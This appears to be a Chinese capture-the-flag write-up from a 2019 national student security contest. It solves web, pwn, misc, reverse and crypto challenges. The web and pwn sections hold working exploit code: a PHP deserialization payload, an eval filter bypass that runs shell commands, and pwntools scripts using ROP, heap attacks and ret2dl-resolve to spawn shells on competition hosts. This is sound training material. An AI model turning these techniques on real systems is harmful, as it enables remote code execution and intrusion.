---
title: 2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp
authorId: Zedd
tags:
  - writeup
categories:
  - Writeup
date: 2019-04-22 22:20
---

Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。

<!--more-->

# Web

##	JustSoso

Index.php

```php+html
<html>
<?php
error_reporting(0); 
$file = $_GET["file"]; 
$payload = $_GET["payload"];
if(!isset($file)){
	echo 'Missing parameter'.'<br>';
}
if(preg_match("/flag/",$file)){
	die('hack attacked!!!');
}
@include($file);
if(isset($payload)){  
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) { 
    	    die('stop hacking!');
    	    exit();
        }
    }
    $payload = unserialize($payload);
}else{ 
   echo "Missing parameters"; 
} 
?>
<!--Please test index.php?file=xxx.php -->
<!--Please get the source of hint.php-->
</html>
```

Hint.php

```php
<?php  
class Handle{ 
    private $handle;  
    public function __wakeup(){
		foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
	public function __construct($handle) { 
        $this->handle = $handle; 
    } 
	public function __destruct(){
		$this->handle->getFlag();
	}
}

class Flag{
    public $file;
    public $token;
    public $token_flag;
 
    function __construct($file){
		$this->file = $file;
		$this->token_flag = $this->token = md5(rand(1,10000));
    }
    
	public function getFlag(){
		$this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
		{
			if(isset($this->file)){
				echo @highlight_file($this->file,true); 
            }  
        }
    }
}
?>
```

从[SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析](https://paper.seebug.org/39/)了解到可以把以下 payload 

```
O:6:"Handle":1:
```

中的 1 改成比 1 大的数可以在反序列化时绕过`__warkeup`魔术方法
绕过`$this->token === $this->token_flag`的判断可以直接通过爆破来绕过

贴一下脚本：

```python
import requests
import time

url ="http://e281a336df8b4ea1b7665704aca7b30246d3cd0663434603.changame.ichunqiu.com///?file=hint.php&payload=O%3A6%3A%22Handle%22%3A3%3A{s%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A{s%3A4%3A%22file%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3Bs%3A10%3A%22token_flag%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3B}}"

proxies ={
    'http':'http://127.0.0.1:8080/'
}

for i in range(1,1000000):
    
    rep = requests.get(url)
    if rep.status_code == 200:
        if 'flag' in rep.text:
            print(rep.text)
    else:
        print(rep.status_code)
    i = i + 1
    time.sleep(1)

# rep = requests.get(url)
# print(rep.status_code)
```



##	love_math

```php
 <?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```

一上午都在懵逼，要么找到可以突破的数学函数，要么突破正则，应该就是这两种思路了。数学函数都看了一遍，貌似没有什么可以利用的函数。正则匹配`/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/`，这个是 [php 变量文档](https://www.php.net/manual/zh/language.variables.basics.php)中匹配有效变量名的正则。感觉两个思路都不对…最有可能的还是突破数学函数…数组可以绕之前的，但是`eval`不能执行

看了好几遍直到看到了`base_convert`可以在进制转换上做文章，而且根据[php文档--base_convert](<https://www.php.net/manual/zh/function.base-convert.php>)，我们可以知道

```
frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
```

也就是第二位，第三位参数可以在 2 到 36 之间，而且高于十进制的用字母表示！既然拼接进去的都是字符串，转换出来拼接进去应该可以执行。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2am7bamdvj22800o8495.jpg)

本地使用`base_convert(55490343972,10,36)()`成功执行`phpinfo`，远程也执行了`phpinfo`看看是不是有什么问题，看了一圈然而并没有发现什么问题。

然后尝试使用各种执行命令

```php
base_convert(15941,10,36);	//cat
base_convert(1751504350,36,10);	//system
base_convert(696468,36,10);	//exec
base_convert(784,36,10);	//ls
base_convert(21269,36,10);	//GET
```

虽然可以执行`ls`了，看到了`flag.php`，但是读不到就比较难受了。然后直接就考虑到了是不是可以有`cat *`这种操作，但是空格跟`*`都无法编码…这就比较头疼了。而且主要是还得全为数字，有字母的的话就会进`whitelist`的判断了。

所以可能要尽量避免去使用十六进制什么的含有字母的，考虑到 ascii 码可以转换，又尝试了使用`chr`函数去转换

```php
($pi=base_convert(9453,12,36)).$pi(101).$pi(120).$pi(101).$pi(99)($pi(99).$pi(97).$pi(116).$pi(32).$pi(42))

($pi=base_convert(9453,12,36)).$pi(101).$pi(120).$pi(101).$pi(99)($pi(108).$pi(115))

$pi(96).$pi(108).$pi(115).$pi(96)
```

一般的构造结果肯定不行…所以这里想用\`ls\`这种形式去执行命令，但是由于拼接的原因，一直不能执行…思路卡了很久。

看了一些相关十六进制处理的函数，直到看到了两个函数，一个`hex2bin`函数，是可以把 16 进制转换成字符串，一个`dechex`函数，把十进制转换成十六进制。

于是我们可以有

```
php > echo base_convert('636174202a',16,10);
426836762666
php > echo hex2bin(dechex(426836762666));
cat *
```

这样我们就可以把`*`这个十六进制为`2a`的转成十进制纯数字的了。

但是我们要怎么利用`hex2bin`呢，想到可以利用`base_convert`赋值变量的方式，找到最短的字符串`pi`，利用`$pi=base_convert(37907361743,10,36)`构造出`hex2bin`。

而且还因为`echo`可以接受如下的拼接方式，例如

```php
php > echo (1).`id`;
1uid=501(zedd) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
php > echo 1,`id`;
1uid=501(zedd) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
```

尽量取最短的，这里肯定我们就用`,`这个形式。

所以大致思路就差不多出来了利用`base_convert`构造`hex2bin`，然后用最短的可以执行命令的`exec`函数去执行`cat *`的命令

```
$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(426836762666)))
```

然而没成功...不知道哪里错了，感觉没道理...

```
($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570206167));

($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570202466));
```

接着队友说可以用`rgrep ag`去弄，而且本地打通了...但是远程以上没打通…我又修改了尝试去`rgrep fl`，也没打通，当时是这样的

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2aowgd5kej228016u4qq.jpg)

写 wp 的时候，突然又发现可以打通了...

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2aoxcl198j21pu096q4j.jpg)

也是神奇...最后当时还是按照自己的思路去走了，感觉是不是哪里出问题了，确定有`flag.php`，最后尝试修改`cat f*`，

```
php > echo base_convert('63617420662a',16,10);
109270211257898
php > echo hex2bin(dechex(109270211257898));
cat f*
```

```
$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(109270211257898)))
```

拿到 flag（复现环境下）

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap2m9nm4j22800xo0xu.jpg)



#	Pwn

## your_pwn

可重复利用的单字节读写的漏洞.

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap50iza8j20b005m3yi.jpg)

先直接读取栈上的返回地址泄露`pie`基址.
然后构造`ROP`链打印库函数地址泄露`libc`.直接调用`system(binsh);`获得`flag`.

```python
from pwn import *

context.log_level = 'debug'
pop_rdi_ret = 0xd03
pop_rsi_r15_ret = 0xd01
#r = process("./pwn")
r = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")

r.recvuntil("name:")
r.sendline("cws")

def get(p):
    i = 0
    ll = 0
    while(1):
        r.recvuntil("index\n")
        r.sendline(str(i + p))
        data = r.recvuntil("value\n")[:-17]
        data = int(data[-2:],16)
        if(i < 8):
            ll += data * (0x100 ** i)
        r.sendline(str(data))
        i += 1
        if(i % 41 == 0):
            r.recvuntil("continue(yes/no)? \n")
            r.sendline("yes")
            return ll

def write(p, x):
    i = 0
    while(1):
        r.recvuntil("index\n")
        r.sendline(str(i + p))
        r.recvuntil("value\n")
        data = 0
        if(i != 40):
            data = (x[i/8] / (0x100 ** (i % 8))) % 0x100
        r.sendline(str(data))
        i += 1
        if(i % 41 == 0):
            r.recvuntil("continue(yes/no)? \n")
            r.sendline("yes")
            return

#ret = get(0x150) - 0x118
#print "ret: " + hex(ret)
pie = get(0x158) - 0xb11
print "pie: " + hex(pie)

write(0x158, [pie + pop_rdi_ret, pie + 0x202020, pie + 0x8B0, pie + 0xb0c, 0, 0, 0, 0])

libc = u64(r.recvuntil("\n")[0:6].ljust(8,'\0')) - 0x06f690
print "libc: " + hex(libc)

system = libc + 0x045390
binsh = libc + 0x18cd57

write(0x158, [pie + pop_rdi_ret, binsh, system, 0, 0, 0, 0, 0])

r.interactive()
```



##	daily

`remove`的时候没有对`index`进行范围检测.

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5am3uuj20a3062aa1.jpg)

先利用`unsorted bin`泄露`libc`,再利用`fastbin`单链表泄露`heap`基址.

申请一个`chunk`,在里面伪造一个堆指针和对应的`faker chunk`.
`free`掉这个`faker chunk`,通过`edit`构造其`fd`到`bss`上,由于`length`可控,通过`remove`构造出一个`chunk`头部绕过检查.
成功`fastbin attack`,获得任意读写的能力,由于程序开了`Full RELRO`所以劫持`__free_hook`调用`system(binsh);`获得`flag`.

```python
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
ptr = 0x602060
r = remote("85c3e0fcae5e972af313488de60e8a5a.kr-lab.com", "58512")

def show():
    r.sendline(str(1))
    data = r.recvuntil("Your choice:")
    return data

def add(length, content):
    r.sendline(str(2))
    r.recvuntil("of daily:")
    r.sendline(str(length))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def edit(index, content):
    r.sendline(str(3))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def remove(index):
    r.sendline(str(4))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("Your choice:")

r.recvuntil("Your choice:")

add(0x100, 'a')#0
add(0x100, 'b')#1
add(0x100, 'c')#2
add(0x100, 'd')#3
remove(0)
remove(2)
add(0x100, 'a' * 8)#0
add(0x100, 'a' * 8)#2

r.sendline(str(1))
r.recvuntil("aaaaaaaa")
heap = u64(r.recvuntil("1 :")[:-3].ljust(8,'\0')) - 0x220
r.recvuntil("aaaaaaaa")
libc = u64(r.recvuntil("3 :")[:-3].ljust(8,'\0')) - 0x3c4b78

print "heap: " + hex(heap)
print "libc: " + hex(libc)

remove(0)
remove(1)
remove(2)
remove(3)

add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0
add(0x20, 'a')#1
add(0x50, 'a')#2
add(0x20, 'a')#3
remove((heap + 0x18 - ptr - 8) / 0x10)
edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18))
remove(1)
add(0x40, 'a')#1
add(0x40, 'a')#4
edit(4, p64(ptr))
edit(2, p64(0x100) + p64(ptr) + p64(0) * 4)
edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57))
edit(1, p64(libc + 	0x045390))

#gdb.attach(r)
r.sendline(str(4))
r.recvuntil("of daily:")
r.sendline(str(2))

r.interactive()
```



##	baby_pwn

`ret2dl in x86`,没有可供`leak`的函数.保护很少,想起之前的`0ctf2018 babystack`,修改脚本直接打,成功.

```python
import sys
import roputils
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
r = remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com", "56833")

rop = roputils.ROP('./pwn')
addr_bss = rop.section('.bss')

buf1 = 'A' * 0x2c
buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)
r.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')
buf2 += rop.fill(100, buf2)
r.send(buf2)

buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)
r.send(buf3)

#gdb.attach(r)

r.interactive()
```



##	Virtual

感觉难度主要在于逆向,理解程序逻辑.

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5helmoj208d0b3aa8.jpg)

首先是`store_instruction`函数将输入通过分隔符分类为各种操作符并保存在堆中,`store_num`同理.
其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据).

重点就是`op`函数.

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5oqogij20ea055jrc.jpg)

这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里`IDA`反汇编有问题,没有识别出函数调用,实际上`i`会被赋值为函数调用的返回值.

这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先`push`.

关键函数是`load`和`save`,知道偏移就可以任意读写.
先使用`load`泄露堆上的堆地址,由于没开`pie`,通过`-`和`/`求出`.got[puts]`和此处偏移,再次`load`泄露`libc`,处理与`system`的偏移获得`system`地址.
不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得`.got[puts]`偏移,调用`save`成功劫持`puts@plt`.
突然发现`username`作用,开始试了`/bin/sh`,`ls`,`cat flag`什么的都是`comment not found`,最后`/bin/bash`成功.(话说这是故意的还是什么鬼)

`payload`

```python
from pwn import *

#context.log_level = 'debug'
#r = process("./pwn")
r = remote("a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com", "40003")

r.recvuntil("Your program name:\n")
r.sendline("/bin/bash")

r.recvuntil("Your instruction:\n")
payload = "push push push load push sub div sub load push add"
payload += " push push push load push sub div sub save"
#payload = "push push push load push sub div sub load pop"
r.sendline(payload)

#gdb.attach(r)

r.recvuntil("Your stack data:\n")
#payload = "-1 8 -5 4210720"
payload = "-1 8 -5 4210720 -172800 -1 8 -6 4210720"
#0x404020 = 4210720,offset = -172800,one_gadget = -173178
r.sendline(payload)

#print r.recv()

r.interactive()
```



##	Double

新增node时 ，会出现重用指针的情况， 导致后面的 uaf

![](https://i.loli.net/2019/04/21/5cbbfe4598cd4.png)

然后 fastbin 改 malloc_hook

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *
from time import sleep

path = "/home/hac425/vm_data/pwn/gs/Double/pwn"
aslr = True
context.log_level = True
context.terminal = ['tmux', 'split', '-h']

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

p = process(path, aslr=aslr)

p = remote("e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com", 40002)


def new(data):
    p.sendlineafter("> ", "1")
    p.sendafter("Your data:", data)


def show(index):
    p.sendlineafter(">", "2")
    p.sendlineafter("index: ", str(index))


def edit(index, data):
    p.sendlineafter(">", "3")
    p.sendlineafter("index: ", str(index))
    sleep(0.1)
    p.send(data)


def delete(index):
    p.sendlineafter(">", "4")
    p.sendlineafter("index: ", str(index))


new("0" * (0x80 - 1) + "\n")  # 0
new("1" * (0x90 - 1) + "\n")  # 1
new("1" * (0x90 - 1) + "\n")  # 2
new("2" * (0x80 - 1) + "\n")  # 3

delete(1)
show(2)

"""
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""

libc.address = u64(p.recv(6) + "\x00" * 2) - libc.symbols['__malloc_hook'] - 0x68
onegadget = libc.address + 0xf1147
info("libc: {}".format(hex(libc.address)))

new("4" * (0x60 - 1) + "\n")  # 4 , 2 ---> 4
new("5" * (0x60 - 1) + "\n")  # 5

delete(4)

edit(2, p64(libc.symbols['__malloc_hook'] - 0x23) + "\n")

new("6" * (0x60 - 1) + "\n")  # 6

new("\x00" * (0x60 - 1) + "\n")  # 7

payload = "\x00" * 0x13
payload += p64(onegadget)
payload += p64(onegadget)
payload += p64(onegadget)
payload += "\n"
edit(7, payload)

p.sendlineafter("> ", "1")

p.interactive()
```



#	Misc

##	签到

三人出境即可



## saleae

通过提示找到 saleae 这个软件，将数据导入，选择 SPI 协议进行分析，可以得到 flag。

导出的分析报告如下：

```
Time [s],Packet ID,MOSI,MISO
0.378724400000000,,f,'0'
0.378730100000000,,l,'0'
0.378735800000000,,a,'0'
0.378741500000000,,g,'0'
0.378747300000000,,{,'0'
0.378753000000000,,1,'0'
0.378758700000000,,2,'0'
0.378764500000000,,0,'0'
0.378770200000000,,7,'0'
0.378775900000000,,1,'0'
0.378781700000000,,3,'0'
0.378787400000000,,9,'0'
0.378793100000000,,7,'0'
0.378798900000000,,-,'0'
0.378804600000000,,1,'0'
0.378810300000000,,9,'0'
0.378816100000000,,d,'0'
0.378821800000000,,1,'0'
0.378827500000000,,-,'0'
0.378833300000000,,4,'0'
0.378839000000000,,8,'0'
0.378844700000000,,e,'0'
0.378850400000000,,6,'0'
0.378856200000000,,-,'0'
0.378861900000000,,b,'0'
0.378867600000000,,e,'0'
0.378873400000000,,8,'0'
0.378879100000000,,c,'0'
0.378884800000000,,-,'0'
0.378890500000000,,7,'0'
0.378896300000000,,8,'0'
0.378902000000000,,4,'0'
0.378907700000000,,b,'0'
0.378913500000000,,8,'0'
0.378919200000000,,9,'0'
0.378924900000000,,a,'0'
0.378930700000000,,9,'0'
0.378936400000000,,5,'0'
0.378942100000000,,e,'0'
0.378947900000000,,0,'0'
0.378953600000000,,7,'0'
0.378959300000000,,},'0'
```

即

```
flag{12071397-19d1-48e6-be8c-784b89a95e07}
```

## 24c

和上一道题类似，导出的数据报告如下：

```
Time [s], Analyzer Name, Decoded Protocol Result
0.843705500000000,I2C,Setup Write to ['160'] + ACK
0.843872000000000,I2C,' ' + ACK
0.844038500000000,I2C,f + ACK
0.844205000000000,I2C,1 + ACK
0.844371000000000,I2C,6 + ACK
0.844537500000000,I2C,3 + ACK
0.844704000000000,I2C,b + ACK
0.844870500000000,I2C,d + ACK
0.845036500000000,I2C,f + ACK
0.845203000000000,I2C,4 + ACK
0.845369500000000,I2C,e + ACK
0.845536000000000,I2C,} + ACK
0.845702500000000,I2C,'0' + ACK
0.945796000000000,I2C,Setup Write to ['160'] + ACK
0.945962500000000,I2C,'0' + ACK
0.946154000000000,I2C,Setup Read to ['161'] + ACK
0.946318000000000,I2C,f + ACK
0.946481500000000,I2C,l + ACK
0.946645000000000,I2C,a + ACK
0.946808500000000,I2C,g + ACK
0.946972000000000,I2C,{ + ACK
0.947135500000000,I2C,c + ACK
0.947299500000000,I2C,4 + ACK
0.947463000000000,I2C,6 + ACK
0.947626500000000,I2C,d + ACK
0.947790000000000,I2C,9 + ACK
0.947953500000000,I2C,e + ACK
0.948117500000000,I2C,1 + ACK
0.948281000000000,I2C,0 + ACK
0.948444500000000,I2C,- + ACK
0.948608000000000,I2C,e + ACK
0.948771500000000,I2C,9 + ACK
0.948935500000000,I2C,b + ACK
0.949099000000000,I2C,5 + ACK
0.949262500000000,I2C,- + ACK
0.949426000000000,I2C,4 + ACK
0.949589500000000,I2C,d + ACK
0.949753000000000,I2C,9 + ACK
0.949917000000000,I2C,0 + ACK
0.950080500000000,I2C,- + ACK
0.950244000000000,I2C,a + ACK
0.950407500000000,I2C,8 + ACK
0.950571000000000,I2C,8 + ACK
0.950734500000000,I2C,3 + ACK
0.950898000000000,I2C,- + ACK
0.951061500000000,I2C,4 + ACK
0.951225000000000,I2C,1 + ACK
0.951388500000000,I2C,c + NAK
5.946480500000000,I2C,Setup Write to ['160'] + ACK
5.946647000000000,I2C,\t + ACK
5.946813500000000,I2C,a + ACK
5.946980000000000,I2C,c + ACK
```

这个神奇的地方在于在接收完后又进行了修改，但是修改哪个地方是很大的问题。制表符一般会跳过 8 个字节，我其实也没想通为什么是这样，不过我尝试了 n 多次，最后终于试出来改变的位置了。

```
flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e}
```



##	usbasp

用之前提供的软件，将协议切换为 SPI，其中的设置修改这里：

```
Enable line is active high
```

可以得到如下输出：

```
Time [s],Packet ID,MOSI,MISO
1.474939400000000,,f,'0'
1.474945500000000,,l,'0'
1.474951600000000,,a,'0'
1.474957700000000,,g,'0'
1.474963800000000,,{,'0'
1.474969900000000,,8,'0'
1.474976000000000,,5,5
1.474982100000000,,b,'0'
1.474988300000000,,0,'0'
1.474994400000000,,8,'0'
1.475000500000000,,4,'0'
1.475006600000000,,c,'0'
1.475012700000000,,6,6
1.475018800000000,,-,-
1.475024900000000,,4,'0'
1.475031100000000,,2,'0'
1.475037200000000,,e,'0'
1.475043300000000,,6,'0'
1.475049400000000,,-,'0'
1.475055500000000,,4,'0'
1.475061600000000,,9,9
1.475067700000000,,5,'5'
1.475073900000000,,c,'0'
1.475080000000000,,-,'0'
1.475086100000000,,8,'0'
1.475092200000000,,7,'0'
1.475098300000000,,b,'0'
1.475104400000000,,4,0
1.475110500000000,,-,-
1.475116600000000,,4,'4'
1.475122800000000,,6,'0'
1.475128900000000,,d,'0'
1.475135000000000,,f,'0'
1.475141100000000,,b,'0'
1.475147200000000,,1,'0'
1.475153300000000,,d,d
1.475159400000000,,f,f
1.475165500000000,,5,'1'
1.475171700000000,,8,'0'
1.475177800000000,,a,'0'
1.475183900000000,,0,'0'
1.475190000000000,,},'0'
1.475196100000000,,'0','0'
```

就可以得到 flag 了。



# Rev

## easyGo

用 [IDAGolangHelper](<https://github.com/sibears/IDAGolangHelper>) 以 Go1.10 版本恢复符号后，动态调试。

在 base64 解码之后下断点，大概位置在：

```assembly
.text:00000000004952EB                 call    encoding_base64__ptr_Encoding_DecodeString ; encoding_base64__ptr_Encoding_DecodeString
.text:00000000004952F0                 mov     rax, [rsp+100h+var_C8]
.text:00000000004952F5                 mov     rcx, [rsp+100h+var_D0]
.text:00000000004952FA                 mov     rdx, [rsp+100h+var_E8]
.text:00000000004952FF                 mov     rbx, [rsp+100h+var_E0]
.text:0000000000495304                 test    rcx, rcx
.text:0000000000495307                 jnz     loc_49541B
```

处。此时查看 rdx 寄存器会发现里面保存着 flag。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g29y0gp6a7j20hg07zgss.jpg)

```
flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}
```



#	Crypto

##	puzzles

question 0 解多元方程
a1=4006,a2=3053,a3=2503,a4=2560 0xfa6 bed 9c7 a00
question 1
前1个和后面2个分别是质数序列上的等差数列，推测出part1
part1=26365399 0x1924dd7
后面3个就是大物高数问题，直接求解答案
question 2 
part2=(1+6^3-5^3+7+1)*77=7700 0x1e14
question 3
part3=18640 0x48d0

question 4
part4=120*336=40320 0x9d80
最后合并起来获得flag



## warmup

阅读源码会发现，输入空可以得到 flag 的加密值，我们可以因此爆破 flag。

爆破脚本：

```python
from pwn import *

p = remote('fc32f84bc46ac22d97e5f876e3100922.kr-lab.com', 12345)
strtable = ['-','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','{','}']

p.recvuntil('plaintext>')
# exit(0)
p.sendline('')
p.recvuntil('result>')
flagstr = p.recvline()
myflag = ''
count = 0

while count<len(flagstr):
    sli = flagstr[count:count+2]
    p.recvuntil('plaintext>')
    for ch in strtable:
        p.sendline(myflag+ch)
        p.recvuntil('result>')
        retflag = p.recvline()
        # print retflag
        retsli = retflag[count:count+2]
        if retsli == sli:
            myflag=myflag+ch
            print myflag
            break
    count = count + 2
```